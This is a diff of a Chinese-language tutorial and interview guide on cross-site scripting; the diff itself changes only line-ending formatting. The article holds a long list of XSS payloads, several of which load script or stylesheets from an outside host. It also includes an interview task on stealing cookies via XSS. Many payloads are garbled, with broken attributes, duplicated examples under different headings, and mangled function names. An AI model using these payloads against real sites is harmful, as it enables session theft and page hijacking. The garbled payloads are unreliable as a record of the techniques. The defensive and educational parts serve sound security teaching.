@@ -34,12 +34,12 @@ XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧�
 
 当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：
 
--  将不可信数据插入到HTML标签之间时；// 例如div, p, td； 
--  将不可信数据插入到HTML属性里时；// 例如：`<div width=$INPUT></div>` 
--  将不可信数据插入到SCRIPT里时；// 例如：`<script>var message = ” $INPUT “;</script>` 
--  还有插入到Style属性里的情况，同样具有一定的危害性；// 例如`<span style=” property : $INPUT ”></span>` 
--  将不可信数据插入到HTML URL里时，// 例如：`<a href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”></a>` 
--  使用富文本时，没有使用XSS规则引擎进行编码过滤。 
+-  将不可信数据插入到HTML标签之间时；// 例如div, p, td；
+-  将不可信数据插入到HTML属性里时；// 例如：`<div width=$INPUT></div>`
+-  将不可信数据插入到SCRIPT里时；// 例如：`<script>var message = ” $INPUT “;</script>`
+-  还有插入到Style属性里的情况，同样具有一定的危害性；// 例如`<span style=” property : $INPUT ”></span>`
+-  将不可信数据插入到HTML URL里时，// 例如：`<a href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”></a>`
+-  使用富文本时，没有使用XSS规则引擎进行编码过滤。
 
 **对于以上的几个场景，若服务端或者前端没有做好防范措施，就会出现漏洞隐患。**
 
@@ -144,77 +144,77 @@ Web浏览器是正在使用的最流行的应用程序之一，当一个新漏�
 
 目前为止已知的mXSS种类，接下来的部分将分别对这几类进行讨论与说明。
 
--  反引号打破属性边界导致的 mXSS；（该类型是最早被发现并利用的一类mXSS，于2007年被提出，随后被有效的修复） 
--  未知元素中的xmlns属性所导致的mXSS；（一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。） 
--  CSS中反斜线转义导致的mXSS；（在CSS中，允许用\来对字符进行转义，例如：`property: 'v\61 lue'` 表示 `property:'value'`，其中61是字母a的ascii码（16进制）。\后也可以接unicode，例如：\20AC 表示 € 。正常情况下，这种转义不会有问题。但是碰上innerHTML后，一些奇妙的事情就会发生。） 
--  CSS中双引号实体或转义导致的mXSS；（接着上一部分，依然是CSS中所存在的问题，`&quot;` `&#x22;` `&#34;` 等双引号的表示形式均可导致这类问题，） 
--  CSS属性名中的转义所导致的mXSS； 
--  非HTML文档中的实体突变； 
--  HTML文档中的非HTML上下文的实体突变； 
+-  反引号打破属性边界导致的 mXSS；（该类型是最早被发现并利用的一类mXSS，于2007年被提出，随后被有效的修复）
+-  未知元素中的xmlns属性所导致的mXSS；（一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。）
+-  CSS中反斜线转义导致的mXSS；（在CSS中，允许用\来对字符进行转义，例如：`property: 'v\61 lue'` 表示 `property:'value'`，其中61是字母a的ascii码（16进制）。\后也可以接unicode，例如：\20AC 表示 € 。正常情况下，这种转义不会有问题。但是碰上innerHTML后，一些奇妙的事情就会发生。）
+-  CSS中双引号实体或转义导致的mXSS；（接着上一部分，依然是CSS中所存在的问题，`&quot;` `&#x22;` `&#34;` 等双引号的表示形式均可导致这类问题，）
+-  CSS属性名中的转义所导致的mXSS；
+-  非HTML文档中的实体突变；
+-  HTML文档中的非HTML上下文的实体突变；
 
 ## 三、XSS攻击代码出现的场景
 
--  **普通的XSS JavaScript注入**，示例如下：  
+-  **普通的XSS JavaScript注入**，示例如下：<br>
 ```xml
 <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
 ```
--  **IMG标签XSS使用JavaScript命令**，示例如下：  
+-  **IMG标签XSS使用JavaScript命令**，示例如下：<br>
 ```xml
 <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
 ```
--  **IMG标签无分号无引号**，示例如下：  
+-  **IMG标签无分号无引号**，示例如下：<br>
 ```css
 <IMG SRC=javascript:alert(‘XSS’)>
 ```
--  **IMG标签大小写不敏感**，示例如下：  
+-  **IMG标签大小写不敏感**，示例如下：<br>
 ```css
 <IMG SRC=JaVaScRiPt:alert(‘XSS’)>
 ```
--  **HTML编码(必须有分号)**，示例如下：  
+-  **HTML编码(必须有分号)**，示例如下：<br>
 ```css
 <IMG SRC=javascript:alert(“XSS”)>
 ```
--  **修正缺陷IMG标签**，示例如下：  
+-  **修正缺陷IMG标签**，示例如下：<br>
 ```xml
 <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
 ```
--  **formCharCode标签**，示例如下：  
+-  **formCharCode标签**，示例如下：<br>
 ```css
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 ```
--  **UTF-8的Unicode编码**，示例如下：  
+-  **UTF-8的Unicode编码**，示例如下：<br>
 ```css
 <IMG SRC=jav..省略..S')>
 ```
--  **7位的UTF-8的Unicode编码是没有分号的**，示例如下：  
+-  **7位的UTF-8的Unicode编码是没有分号的**，示例如下：<br>
 ```css
 <IMG SRC=jav..省略..S')>
 ```
--  **十六进制编码也是没有分号**，示例如下：  
+-  **十六进制编码也是没有分号**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" /span>
 ```
--  **嵌入式标签,将Javascript分开**，示例如下：  
+-  **嵌入式标签,将Javascript分开**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
 ```
--  **嵌入式编码标签,将Javascript分开**，示例如下：  
+-  **嵌入式编码标签,将Javascript分开**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
 ```
--  **嵌入式换行符**，示例如下：  
+-  **嵌入式换行符**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
 ```
--  **嵌入式回车**，示例如下：  
+-  **嵌入式回车**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
 ```
--  **嵌入式多行注入JavaScript,这是XSS极端的例子**，示例如下：  
+-  **嵌入式多行注入JavaScript,这是XSS极端的例子**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" /span>
 ```
--  **解决限制字符(要求同页面)**，示例如下：  
+-  **解决限制字符(要求同页面)**，示例如下：<br>
 ```javascript
       <script>z=z+ ’write(“‘</script>
 
@@ -234,158 +234,158 @@ Web浏览器是正在使用的最流行的应用程序之一，当一个新漏�
 
       <script>eval_r(z)</script>
 ```
--  **空字符**，示例如下：  
+-  **空字符**，示例如下：<br>
 ```css
       perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
 ```
--  **空字符2,空字符在国内基本没效果.因为没有地方可以利用**，示例如下：  
+-  **空字符2,空字符在国内基本没效果.因为没有地方可以利用**，示例如下：<br>
 ```scss
       perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
 ```
--  **Spaces和meta前的IMG标签**，示例如下：  
+-  **Spaces和meta前的IMG标签**，示例如下：<br>
 ```css
-<IMG SRC=\'#\'"  
+<IMG SRC=\'#\'"
 
 javascript:alert(‘XSS’);”>
 ```
--  **Non-alpha-non-digit XSS**，示例如下：  
+-  **Non-alpha-non-digit XSS**，示例如下：<br>
 ```css
 <SCRIPT/XSS SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
 ```
--  **Non-alpha-non-digit XSS to 2**，示例如下：  
+-  **Non-alpha-non-digit XSS to 2**，示例如下：<br>
 ```css
 <BODY onload!#$%&()*~+ -_.,:;?@[/|\]^`=alert(“XSS”)>
 ```
--  **Non-alpha-non-digit XSS to 3**，示例如下：  
+-  **Non-alpha-non-digit XSS to 3**，示例如下：<br>
 ```css
 <SCRIPT/SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
 ```
--  **双开括号**，示例如下：  
+-  **双开括号**，示例如下：<br>
 ```xml
 <<SCRIPT>alert(“XSS”);//<</SCRIPT>
 ```
--  **无结束脚本标记(仅火狐等浏览器)**，示例如下：  
+-  **无结束脚本标记(仅火狐等浏览器)**，示例如下：<br>
 ```xml
 <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
 ```
--  **无结束脚本标记2**，示例如下：  
+-  **无结束脚本标记2**，示例如下：<br>
 ```xml
 <SCRIPT SRC=//3w.org/XSS/xss.js>
 ```
--  **半开的HTML/JavaScript XSS**，示例如下：  
+-  **半开的HTML/JavaScript XSS**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" /span>
 ```
--  **双开角括号**，示例如下：  
+-  **双开角括号**，示例如下：<br>
 ```css
 <iframe src=http://3w.org/XSS.html <
 ```
--  **无单引号 双引号 分号**，示例如下：  
+-  **无单引号 双引号 分号**，示例如下：<br>
 ```xml
 <SCRIPT>a=/XSS/
 alert(a.source)</SCRIPT>
 ```
--  **换码过滤的JavaScript**，示例如下：  
+-  **换码过滤的JavaScript**，示例如下：<br>
 ```scss
   \”;alert(‘XSS’);//
 ```
--  **结束Title标签**，示例如下：  
+-  **结束Title标签**，示例如下：<br>
 ```xml
 </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
 ```
--  **Input Image**，示例如下：  
+-  **Input Image**，示例如下：<br>
 ```css
 <INPUT SRC=\'#\'" /span>
 ```
--  **BODY Image**，示例如下：  
+-  **BODY Image**，示例如下：<br>
 ```css
 <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
 ```
--  **BODY标签**，示例如下：  
+-  **BODY标签**，示例如下：<br>
 ```css
 <BODY(‘XSS’)>
 ```
--  **IMG Dynsrc**，示例如下：  
+-  **IMG Dynsrc**，示例如下：<br>
 ```css
 <IMG DYNSRC=\'#\'" /span>
 ```
--  **IMG Lowsrc**，示例如下：  
+-  **IMG Lowsrc**，示例如下：<br>
 ```css
 <IMG LOWSRC=\'#\'" /span>
 ```
--  **BGSOUND**，示例如下：  
+-  **BGSOUND**，示例如下：<br>
 ```css
 <BGSOUND SRC=\'#\'" /span>
 ```
--  **STYLE sheet**，示例如下：  
+-  **STYLE sheet**，示例如下：<br>
 ```ini
 <LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>
 ```
--  **远程样式表**，示例如下：  
+-  **远程样式表**，示例如下：<br>
 ```xml
 <LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>
 ```
--  **List-style-image(列表式)**，示例如下：  
+-  **List-style-image(列表式)**，示例如下：<br>
 ```xml
 <STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS
 ```
--  **IMG VBscript**，示例如下：  
+-  **IMG VBscript**，示例如下：<br>
 ```css
 <IMG SRC=\'#\'" /STYLE><UL><LI>XSS
 ```
--  **META链接url**，示例如下：  
+-  **META链接url**，示例如下：<br>
 ```xml
 <META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>
 ```
--  **Iframe**，示例如下：  
+-  **Iframe**，示例如下：<br>
 ```css
 <IFRAME SRC=\'#\'" /IFRAME>
 ```
--  **Frame**，示例如下：  
+-  **Frame**，示例如下：<br>
 ```xml
 <FRAMESET><FRAME SRC=\'#\'" /FRAMESET>
 ```
--  **Table**，示例如下：  
+-  **Table**，示例如下：<br>
 ```css
 <TABLE BACKGROUND=”javascript:alert(‘XSS’)”>
 ```
--  **TD**，示例如下：  
+-  **TD**，示例如下：<br>
 ```css
 <TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>
 ```
--  **DIV background-image**，示例如下：  
+-  **DIV background-image**，示例如下：<br>
 ```css
 <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
 ```
--  **DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)**，示例如下：  
+-  **DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)**，示例如下：<br>
 ```css
 <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
 ```
--  **DIV expression**，示例如下：  
+-  **DIV expression**，示例如下：<br>
 ```css
 <DIV STYLE=”width: expression_r(alert(‘XSS’));”>
 ```
--  **STYLE属性分拆表达**，示例如下：  
+-  **STYLE属性分拆表达**，示例如下：<br>
 ```css
 <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
 ```
--  **匿名STYLE(组成:开角号和一个字母开头)**，示例如下：  
+-  **匿名STYLE(组成:开角号和一个字母开头)**，示例如下：<br>
 ```css
 <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
 ```
--  **STYLE background-image**，示例如下：  
+-  **STYLE background-image**，示例如下：<br>
 ```xml
 <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A CLASS=XSS></A>
 ```
--  **IMG STYLE方式**，示例如下：  
+-  **IMG STYLE方式**，示例如下：<br>
 ```scss
   exppression(alert(“XSS”))’>
 ```
--  **STYLE background**，示例如下：  
+-  **STYLE background**，示例如下：<br>
 ```xml
 <STYLE><STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>
 ```
--  **BASE**，示例如下：  
+-  **BASE**，示例如下：<br>
 ```ini
 <BASE HREF=”javascript:alert(‘XSS’);//”>
 ```
@@ -421,8 +421,8 @@ DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、o
 
 在前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式 （.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。
 
--  Javascript：可以使用textContent或者innerText的地方，尽量不使用innerHTML； 
--  query：可以使用text()得地方，尽量不使用html()； 
+-  Javascript：可以使用textContent或者innerText的地方，尽量不使用innerHTML；
+-  query：可以使用text()得地方，尽量不使用html()；
 
 ### 4.拼接HTML时对其进行转义
 
@@ -452,16 +452,16 @@ DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、o
 
 #### **问题**：
 
-- **存储型 XSS**：  
+- **存储型 XSS**：<br>
   - 什么是存储型 XSS？它的攻击过程是什么？
   - 能否举例说明存储型 XSS 的常见场景？
-- **反射型 XSS**：  
+- **反射型 XSS**：<br>
   - 什么是反射型 XSS？与存储型 XSS 的主要区别是什么？
   - 常见的反射型 XSS 攻击点在哪里？
-- **DOM 型 XSS**：  
+- **DOM 型 XSS**：<br>
   - 什么是 DOM 型 XSS？它与存储型和反射型的区别是什么？
   - DOM 型 XSS 的常见场景有哪些？
-- **问题延展**：  
+- **问题延展**：<br>
   - 哪种 XSS 的危害最大？为什么？
   - 你是否了解混合型 XSS？它是如何运作的？
 
@@ -471,7 +471,7 @@ DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、o
 
 #### **问题**：
 
-- 在用户输入的数据没有被过滤的情况下，哪些地方容易受到 XSS 攻击？  
+- 在用户输入的数据没有被过滤的情况下，哪些地方容易受到 XSS 攻击？<br>
   - 例如：HTML 标签内、属性值、事件处理器、URL、CSS、JSON。
 - 什么是基于 `<script>` 注入的 XSS？它与其他标签注入（如 `<img>`）有什么不同？
 - 在现代框架（如 React、Vue）中，是否可能出现 XSS？如果可能，请举例说明。
@@ -492,20 +492,20 @@ DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、o
 
 #### **问题**：
 
-- **编码与过滤**：  
+- **编码与过滤**：<br>
   - 什么是输入过滤和输出编码？为什么都很重要？
   - 对于不同的上下文（HTML、属性、URL、JavaScript 等），如何进行输出编码？
   - 使用 `encodeURIComponent` 和 `escape` 时，需要注意哪些问题？
-- **内容安全策略（CSP）**：  
+- **内容安全策略（CSP）**：<br>
   - 什么是 CSP？它是如何防御 XSS 的？
   - 如何配置 CSP？有哪些常见的错误配置？
-- **防止 DOM 型 XSS**：  
+- **防止 DOM 型 XSS**：<br>
   - 为什么不推荐使用 `innerHTML` 等 API？
   - 安全替代方案有哪些（如 `textContent`、`setAttribute`）？
-- **现代框架的内置防护**：  
+- **现代框架的内置防护**：<br>
   - React、Vue 等框架如何默认防御 XSS？
   - 使用这些框架时，是否有场景需要开发者特别注意？
-- **其他防御策略**：  
+- **其他防御策略**：<br>
   - 什么是 HTTP-only Cookie？它与 XSS 防御有什么关系？
   - 如何利用 Subresource Integrity（SRI）防御第三方资源中的恶意代码？
 
@@ -537,7 +537,7 @@ DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、o
 #### **问题**：
 
 - 设计一个简单的场景，让候选人模拟如何通过 XSS 攻击获取 Cookie。
-- 给出一段含漏洞的代码片段，要求候选人分析并修复：  
+- 给出一段含漏洞的代码片段，要求候选人分析并修复：<br>
 ```javascript
 const query = location.search;
 document.body.innerHTML = `<div>${query}</div>`;
